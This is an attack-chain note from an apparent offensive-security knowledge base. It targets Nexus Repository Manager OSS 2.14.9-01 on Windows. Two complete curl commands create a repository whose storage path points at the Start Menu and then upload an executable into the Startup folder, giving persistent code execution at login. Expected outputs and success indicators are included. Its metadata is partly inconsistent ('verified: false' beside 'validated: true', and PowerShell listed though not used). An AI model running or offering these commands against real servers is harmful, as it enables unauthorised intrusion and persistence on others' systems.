---
id: a1b2c3d4-e5f6-7890-abcd-ef1234567890
tags:
  - nexus
  - file-upload
  - rce
  - persistence
  - windows-startup
type: attack_chain
tools: []
tactics:
  - '[[Initial Access]]'
  - '[[Execution]]'
  - '[[Persistence]]'
verified: false
platforms:
  - Web
  - Windows
submitted: true
complexity: medium
created_at: '2023-10-01T00:00:00Z'
procedures:
  - '[[procedures/Create-Custom-Maven-Repository-with-Arbitrary-Storage-Path]]'
  - >-
    [[procedures/Upload-Executable-to-Windows-Startup-Folder-via-Maven-Artifact]]
step_count: 2
techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[Registry Run Keys - Startup Folder]]'
  - '[[PowerShell]]'
updated_at: '2025-12-14T05:32:10.457Z'
description: >-
  Authenticated exploitation of Nexus Repository Manager 2 to create a custom
  repository with arbitrary storage path and upload executables to the Windows
  Startup folder for persistent RCE as SYSTEM.
skill_level: intermediate
impact_level: high
validated: true
mitre_tactics:
  - '[[Initial Access]]'
  - '[[Execution]]'
  - '[[Persistence]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[Registry Run Keys - Startup Folder]]'
  - '[[PowerShell]]'
---
# Unrestricted File Upload in Nexus Repository Manager Leading to RCE via Windows Startup Folder

Multi-stage attack chain demonstrating exploitation of Nexus Repository Manager OSS 2.14.9-01 for arbitrary file writes on Windows, leading to persistent remote code execution as the SYSTEM user.

## Chain Metrics Dashboard

| Metric | Value |
|--------|-------|
| Chain Status | Unverified |
| Total Steps | 2 |
| Execution Time | ~5 minutes |
| Skill Level | Intermediate |
| Complexity | Medium |
| Impact Level | High |

## Attack Flow Visualization

```mermaid
graph LR
    A[Initial Access via Valid Admin Credentials] --> B[Create Custom Repository]
    B --> C[Upload Executable to Startup Folder]
    C --> D[Persistence and RCE on Login]

    style A fill:#e74c3c
    style B fill:#f39c12
    style C fill:#3498db
    style D fill:#27ae60
```

## Prerequisites & Requirements

### Required Tools

- [[commands/curl-create-custom-repo]]
- [[commands/curl-upload-artifact-to-startup]]

### Target Environment

- Nexus Repository Manager OSS 2.14.9-01 running on Windows
- Web interface accessible (default port 8081)
- Java-based web application with Noelios-Restlet-Engine/1.1.6-SONATYPE-5348-V8

### Initial Access Requirements

- Authenticated administrator session (NXSESSIONID cookie required)
- Network access to the Nexus host
- No prior access needed beyond valid admin credentials

## Detailed Attack Procedures

### Step 1: Create Custom Repository
procedure: [[procedures/Create-Custom-Maven-Repository-with-Arbitrary-Storage-Path]]

**Objective**: Establish a hosted Maven2 repository with an overridden storage URL pointing to a sensitive Windows path, enabling arbitrary file placement.

**Instructions**: Use [[commands/curl-create-custom-repo]] to send a POST request creating the repository with overrideLocalStorageUrl set to the Start Menu path (two levels above Startup):

```bash
curl -X POST 'http://nexus-host:8081/nexus/service/local/repositories' \
  -H 'Content-Type: application/json' \
  -H 'Cookie: NXSESSIONID=1a76b0cd-7fb1-4095-9671-2365226df770' \
  -d '{"data":{"repoType":"hosted","id":"5000","name":"MyTestRepo","writePolicy":"ALLOW_WRITE_ONCE","browseable":true,"indexable":true,"exposed":true,"notFoundCacheTTL":1440,"repoPolicy":"RELEASE","provider":"maven2","providerRole":"org.sonatype.nexus.proxy.repository.Repository","overrideLocalStorageUrl":"file:/c:/Users/myuser/Appdata/Roaming/Microsoft/Windows/Start Menu","downloadRemoteIndexes":false,"checksumPolicy":"IGNORE"}}'
```

**Expected Output**: HTTP 201 Created with JSON confirming repository creation, including the overridden storage URL.

**Success Indicators**:
- Repository ID 5000 created successfully
- No validation errors on overrideLocalStorageUrl

### Step 2: Upload Executable
procedure: [[procedures/Upload-Executable-to-Windows-Startup-Folder-via-Maven-Artifact]]

**Objective**: Upload a malicious executable (e.g., calc.exe) to the Windows Startup folder using manipulated Maven parameters, achieving persistence and RCE on user login.

**Instructions**: Use [[commands/curl-upload-artifact-to-startup]] to POST the file with groupId (g: Programs), artifactId (a: Startup), and version (v: .) to construct the target path relative to the custom storage:

```bash
curl -X POST 'http://nexus-host:8081/nexus/service/local/artifact/maven/content' \
  -H 'Cookie: NXSESSIONID=1a76b0cd-7fb1-4095-9671-2365226df770' \
  -F 'r=5000' \
  -F 'g=Programs' \
  -F 'a=Startup' \
  -F 'v=.' \
  -F 'p=jar' \
  -F 'c=637' \
  -F 'e=exe' \
  -F 'file=@calc.exe'
```

**Expected Output**: HTTP 201 Created with JSON echoing the parameters; verify file placement at C:/Users/myuser/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/calc.exe.

**Success Indicators**:
- File uploaded without path validation errors
- Executable present in Startup folder, executes on login as SYSTEM

## Attack Chain Summary

### Key Achievements

1. Bypassed storage restrictions to write files to arbitrary Windows paths
2. Achieved persistent RCE by placing executable in auto-start location
3. Enabled privilege escalation and lateral movement as SYSTEM user

## Technique & Tactic Coverage

### MITRE ATT&CK Techniques

- [[Exploit Public-Facing Application]]
- [[Registry Run Keys - Startup Folder]]
- [[PowerShell]]

### MITRE ATT&CK Tactics

- [[Initial Access]]
- [[Execution]]
- [[Persistence]]

---
*Last updated: 2023-10-01T00:00:00Z*
